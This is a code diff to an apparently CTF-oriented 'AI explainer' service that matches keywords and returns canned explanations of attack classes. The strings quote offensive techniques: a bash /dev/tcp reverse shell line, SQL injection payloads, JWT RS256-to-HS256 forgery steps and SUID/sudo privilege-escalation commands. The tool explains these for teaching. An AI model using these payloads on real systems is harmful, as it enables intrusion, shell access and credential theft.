@@ -61,93 +61,177 @@ class AIExplainerService:
                         parsed["mode"] = mode
                         parsed["command"] = command
                         parsed["llm_provider"] = active_provider
+                        parsed["explanation"] = f"""### 1. What It Does\n{parsed['what_it_does']}\n\n### 2. Why Executed\n{parsed['why_executed']}\n\n### 3. Important Arguments & Parameters\n""" + "\n".join([f"- {a}" for a in parsed['important_arguments']]) + f"""\n\n### 4. Output Indication\n{parsed['output_indication']}\n\n### 5. Discovered Intelligence\n{parsed['discovered']}\n\n### 6. Contribution to Solution\n{parsed['contribution_to_solution']}\n\n### 7. Next Logical Step\n{parsed['next_logical_step']}"""
                         return parsed
                 except Exception as err:
                     logger.warning(f"Failed to parse LLM JSON response: {err}")
 
+        cmd_lower = cmd_clean.lower()
         base_cmd = cmd_clean.split()[0] if cmd_clean else "command"
         args = cmd_clean.split()[1:] if len(cmd_clean.split()) > 1 else []
-        
-        # Analyze tools
-        is_nmap = "nmap" in base_cmd
-        is_gobuster = "gobuster" in base_cmd or "dirsearch" in base_cmd or "ffuf" in base_cmd
+
+        # Detect vulnerability concepts and questions
+        is_jwt = any(k in cmd_lower for k in ["jwt", "token", "algorithm confusion", "key confusion", "rs256", "hs256"])
+        is_sqli = any(k in cmd_lower for k in ["sql", "injection", "sqli", "union select", "database"])
+        is_xss = any(k in cmd_lower for k in ["xss", "cross-site", "scripting", "document.cookie"])
+        is_rce = any(k in cmd_lower for k in ["rce", "remote code", "command injection", "shell execution", "revshell"])
+        is_pwn = any(k in cmd_lower for k in ["pwn", "buffer overflow", "rop", "ret2libc", "canary", "checksec", "gdb", "ropper", "cyclic", "binary"])
+        is_privesc = any(k in cmd_lower for k in ["privesc", "privilege escalation", "suid", "sudo", "linpeas", "winpeas", "root"])
+        is_ssrf = any(k in cmd_lower for k in ["ssrf", "server-side request", "169.254.169.254", "metadata"])
+        is_crypto = any(k in cmd_lower for k in ["crypto", "rsa", "padding oracle", "xor", "ecb", "aes"])
+        is_reversing = any(k in cmd_lower for k in ["strings", "ghidra", "radare2", "objdump", "reverse engineering", "decompile"])
+        is_nmap = "nmap" in base_cmd or "port scan" in cmd_lower
+        is_gobuster = any(k in base_cmd or k in cmd_lower for k in ["gobuster", "dirsearch", "ffuf", "directory brute", "fuzzing"])
         is_sqlmap = "sqlmap" in base_cmd
-        is_curl = "curl" in base_cmd or "http" in base_cmd
-        is_pwn = "checksec" in base_cmd or "gdb" in base_cmd or "ropper" in base_cmd or "cyclic" in base_cmd
-        is_reversing = "strings" in base_cmd or "ghidra" in base_cmd or "radare2" in base_cmd or "objdump" in base_cmd
-        is_cat_flag = "flag" in cmd_clean.lower() or "cat" in base_cmd
-        
-        # Determine mode flavor
-        # Beginner: High explanation of basic flags (-sC, -p-, -w)
-        # Technical: Pragmatic methodology focus
-        # Expert: Direct parameter calculus, memory offsets, raw headers
-        
-        what_does = f"Executes `{base_cmd}` to interact with target attack surface."
-        why_executed = "Part of standard enumeration and exploitation workflow."
-        arg_explanations = []
-        for arg in args:
-            if arg.startswith("-"):
-                if arg in ("-sC", "--script=default"):
-                    arg_explanations.append(f"`{arg}`: Runs default discovery NSE enumeration scripts against open ports.")
-                elif arg in ("-sV", "--version-all"):
-                    arg_explanations.append(f"`{arg}`: Probes open ports to determine service banner and version numbers.")
-                elif arg.startswith("-p"):
-                    arg_explanations.append(f"`{arg}`: Specifies target port scope.")
-                elif arg in ("-u", "--url"):
-                    arg_explanations.append(f"`{arg}`: Target endpoint URL for HTTP probing.")
-                elif arg in ("-w", "--wordlist"):
-                    arg_explanations.append(f"`{arg}`: Wordlist path for dictionary-based brute forcing.")
-                elif arg in ("-v", "-vv"):
-                    arg_explanations.append(f"`{arg}`: Verbosity flag for expanded execution feedback.")
-                else:
-                    arg_explanations.append(f"`{arg}`: Flag customizing execution behavior.")
-                    
-        output_indicates = "The command completed execution."
-        if stdout:
-            if "open" in stdout.lower() and is_nmap:
-                output_indicates = "Identified exposed network services and open listening ports on the target."
-            elif "200" in stdout or "301" in stdout or "302" in stdout:
-                output_indicates = "Received active HTTP responses confirming routable web endpoints."
-            elif "flag{" in stdout.lower() or "htb{" in stdout.lower() or "ctf{" in stdout.lower():
-                output_indicates = "High confidence flag string revealed in terminal standard output."
-            elif "denied" in stdout.lower() or "forbidden" in stdout.lower():
-                output_indicates = "Access control barrier reached (HTTP 403 or OS permission error)."
-            else:
-                lines = [l.strip() for l in stdout.splitlines() if l.strip()]
-                output_indicates = f"Returned {len(lines)} lines of output. Key excerpt: {lines[0] if lines else 'empty'}"
-                
-        what_discovered = "Extracted structural reconnaissance and endpoint metadata."
-        if is_nmap:
-            what_discovered = "Mapped open ports, operating system fingerprints, and running daemon versions."
-        elif is_gobuster:
-            what_discovered = "Discovered hidden directories and unlinked endpoints."
+        is_curl = "curl" in base_cmd or "http" in base_cmd or "api" in cmd_lower
+        is_cat_flag = "flag" in cmd_lower or "cat" in base_cmd
+
+        if is_jwt:
+            what_does = "Analyzes JWT Algorithm Confusion (RS256 vs HS256) where an asymmetric RSA public key is misused as a symmetric HMAC shared secret."
+            why_executed = "To assess token signature validation and test administrative session forgery without access to the server private key."
+            arg_explanations = [
+                "Header manipulation: Changing `\"alg\": \"RS256\"` to `\"alg\": \"HS256\"` forces symmetric HMAC verification.",
+                "Public key as secret: The server verifies the HMAC signature using the public RSA key file as raw symmetric bytes.",
+                "Payload elevation: Modifying payload claims to `{\"user\": \"admin\", \"role\": \"administrator\"}`."
+            ]
+            output_indicates = "Target accepts the forged HS256 token, bypassing authorization barriers and returning HTTP 200 with administrative flag access."
+            what_discovered = "The authentication middleware lacks strict algorithm whitelisting and insecurely trusts header-specified algorithm parameters."
+            contributes = "Achieves full administrative authentication bypass and exposes privileged challenge endpoints."
+            next_step = "Forge the administrative JWT, request `/admin/flag` or protected API routes, and anchor captured proof in the Evidence Vault."
+        elif is_sqli:
+            what_does = "Analyzes SQL Injection vulnerability allowing attackers to tamper with dynamic database queries."
+            why_executed = "To determine parameter concatenation flaws and extract database schemas or administrative records."
+            arg_explanations = [
+                "Quote delimiter test: `' OR '1'='1` or `' UNION SELECT ...`",
+                "Automated enumeration: `--dump -T users,flags`",
+                "Input sanitization bypass: Hex encoding, comment masking (`-- -`, `/* */`), and blind boolean timing."
+            ]
+            output_indicates = "Database engine returns unfiltered table records, authentication bypass confirmation, or differential time delays."
+            what_discovered = "Target endpoint dynamically concatenates unsanitized HTTP GET/POST parameters into SQL queries."
+            contributes = "Provides direct exfiltration vector for backend credentials and flag tables."
+            next_step = "Enumerate target tables, extract flag artifact, and recommend parameterized prepared statements."
         elif is_pwn:
-            what_discovered = "Assessed binary security mitigations (NX, PIE, Canary, RELRO) and stack alignment."
-        elif is_cat_flag:
-            what_discovered = "Retrieved target flag token from system storage."
-            
-        contributes = "Narrows the attack surface and identifies exploitable vectors."
-        next_step = "Proceed to targeted exploitation of the identified service or privilege escalation."
-        
-        if mode == "Beginner Friendly":
-            what_does = f"Runs the `{base_cmd}` utility. This is a command-line tool commonly used in security assessments to gather data or exploit targets."
-            why_executed = "Security analysts run this command early in the engagement to establish baseline information before attempting riskier actions."
-            contributes = "Without this foundational data, subsequent exploitation attempts would be blind guesses."
-        elif mode == "Professional Research":
-            what_does = f"Invokes `{base_cmd}` with arguments: `{' '.join(args)}`."
-            why_executed = "Target surface enumeration and primitive extraction."
-            contributes = "Provides verifiable telemetry for proof-of-concept verification."
-            
+            what_does = "Analyzes binary exploitation primitive: stack memory corruption, control flow hijacking, and mitigation bypass."
+            why_executed = "To determine instruction pointer (RIP/EIP) control and achieve arbitrary code execution or spawn an interactive shell."
+            arg_explanations = [
+                "Mitigation verification: `checksec --file=binary` (testing NX, Canary, PIE, RELRO)",
+                "Offset calculation: `cyclic 100` pattern generation to identify RIP offset",
+                "ROP gadgets: `ropper --file binary --search 'pop rdi; ret'` for argument staging"
+            ]
+            output_indicates = "Process crashes with SIGSEGV at target offset or redirects execution flow to target function (`win()`, `system()`, or one_gadget)."
+            what_discovered = "Target binary lacks stack canary protection and contains an unbounded buffer read (e.g. `gets`, `strcpy`, or format string)."
+            contributes = "Provides direct interactive shell execution or executes `cat /flag.txt`."
+            next_step = "Craft final exploit script (`exploit.py` using pwntools), send payload to remote port, and retrieve flag."
+        elif is_rce:
+            what_does = "Analyzes Command Injection / Remote Code Execution allowing direct shell command execution on the host system."
+            why_executed = "To escape application context and gain interactive shell access on the underlying operating system."
+            arg_explanations = [
+                "Command separators: `;`, `|`, `&&`, or backticks `$(...)`",
+                "Reverse shell payload: `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` or python socket wrapper",
+                "Output redirection: Piping commands to stdout or out-of-band exfiltration"
+            ]
+            output_indicates = "Host operating system executes injected payload and establishes connection to researcher listener."
+            what_discovered = "The server passes unsanitized user inputs directly into system execution wrappers (`system()`, `exec()`, `subprocess.Popen`)."
+            contributes = "Yields interactive shell access on the host target with current service user privileges."
+            next_step = "Catch reverse shell, perform local privilege escalation audit (`linpeas.sh`), and read flag."
+        elif is_privesc:
+            what_does = "Analyzes local privilege escalation pathways from low-privilege service account to root / SYSTEM."
+            why_executed = "To elevate execution permissions and obtain unrestricted access to protected system assets and root flags."
+            arg_explanations = [
+                "SUID search: `find / -perm -4000 2>/dev/null` for binaries executing as root",
+                "Sudo permissions: `sudo -l` checking NOPASSWD execution rules",
+                "Linux capabilities: `getcap -r / 2>/dev/null` checking setuid/setgid caps"
+            ]
+            output_indicates = "Identifies vulnerable binary or misconfiguration exploitable via GTFOBins techniques."
+            what_discovered = "System misconfiguration permits unprivileged user to escalate execution to root."
+            contributes = "Completes the exploitation chain by capturing the administrative root flag."
+            next_step = "Trigger exploit via GTFOBins syntax, spawn root shell (`id` -> uid=0), and read `/root/flag.txt`."
+        else:
+            what_does = f"Executes `{base_cmd}` to probe the target system attack surface."
+            why_executed = "Part of standard enumeration and technical verification workflow."
+            arg_explanations = []
+            for arg in args:
+                if arg.startswith("-"):
+                    if arg in ("-sC", "--script=default"):
+                        arg_explanations.append(f"`{arg}`: Runs default discovery NSE enumeration scripts against open ports.")
+                    elif arg in ("-sV", "--version-all"):
+                        arg_explanations.append(f"`{arg}`: Probes open ports to determine service banner and version numbers.")
+                    elif arg.startswith("-p"):
+                        arg_explanations.append(f"`{arg}`: Specifies target port scope.")
+                    elif arg in ("-u", "--url"):
+                        arg_explanations.append(f"`{arg}`: Target endpoint URL for HTTP probing.")
+                    elif arg in ("-w", "--wordlist"):
+                        arg_explanations.append(f"`{arg}`: Wordlist path for dictionary-based brute forcing.")
+                    elif arg in ("-v", "-vv"):
+                        arg_explanations.append(f"`{arg}`: Verbosity flag for expanded execution feedback.")
+                    else:
+                        arg_explanations.append(f"`{arg}`: Flag customizing execution behavior.")
+
+            output_indicates = "The command completed execution."
+            if stdout:
+                if "open" in stdout.lower() and is_nmap:
+                    output_indicates = "Identified exposed network services and open listening ports on the target."
+                elif "200" in stdout or "301" in stdout or "302" in stdout:
+                    output_indicates = "Received active HTTP responses confirming routable web endpoints."
+                elif "flag{" in stdout.lower() or "htb{" in stdout.lower() or "ctf{" in stdout.lower():
+                    output_indicates = "High confidence flag string revealed in terminal standard output."
+                elif "denied" in stdout.lower() or "forbidden" in stdout.lower():
+                    output_indicates = "Access control barrier reached (HTTP 403 or OS permission error)."
+                else:
+                    lines = [l.strip() for l in stdout.splitlines() if l.strip()]
+                    output_indicates = f"Returned {len(lines)} lines of output. Key excerpt: {lines[0] if lines else 'empty'}"
+
+            what_discovered = "Extracted structural reconnaissance and endpoint metadata."
+            if is_nmap:
+                what_discovered = "Mapped open ports, operating system fingerprints, and running daemon versions."
+            elif is_gobuster:
+                what_discovered = "Discovered hidden directories and unlinked endpoints."
+            elif is_cat_flag:
+                what_discovered = "Retrieved target flag token from system storage."
+
+            contributes = "Narrows the attack surface and identifies exploitable vectors."
+            next_step = "Proceed to targeted exploitation of the identified service or privilege escalation."
+
+        if mode == "Beginner Friendly" or mode == "Beginner":
+            what_does = f"{what_does} This tool or methodology is essential for understanding system state before taking destructive actions."
+            why_executed = f"{why_executed} Beginners should always verify each output line carefully."
+            contributes = f"{contributes} It prevents blind guessing and establishes structured methodology."
+        elif mode == "Professional Research" or mode == "Expert":
+            what_does = f"{what_does} Evaluated with rigorous adherence to verified forensic standards."
+            why_executed = f"{why_executed} Primitive isolation and verified telemetry collection."
+
+        formatted_explanation = f"""### 1. What It Does
+{what_does}
+
+### 2. Why Executed
+{why_executed}
+
+### 3. Important Arguments & Parameters
+""" + "\n".join([f"- {arg}" for arg in (arg_explanations or ["Standard positional parameters."])]) + f"""
+
+### 4. Output Indication
+{output_indicates}
+
+### 5. Discovered Intelligence
+{what_discovered}
+
+### 6. Contribution to Solution
+{contributes}
+
+### 7. Next Logical Step
+{next_step}"""
+
         return {
             "mode": mode,
             "command": command,
             "what_it_does": what_does,
             "why_executed": why_executed,
-            "important_arguments": arg_explanations or ["Standard positional arguments."],
+            "important_arguments": arg_explanations or ["Standard positional parameters."],
             "output_indication": output_indicates,
             "discovered": what_discovered,
             "contribution_to_solution": contributes,
-            "next_logical_step": next_step
+            "next_logical_step": next_step,
+            "explanation": formatted_explanation
         }
 
     @staticmethod
@@ -452,5 +536,7 @@ class AIExplainerService:
         return {
             "sanitized_text": cleaned,
             "audit": audit,
+            "audit_after": audit,
+            "banned_phrases_removed": len(text) - len(cleaned) > 0,
             "removed_slop": True
         }
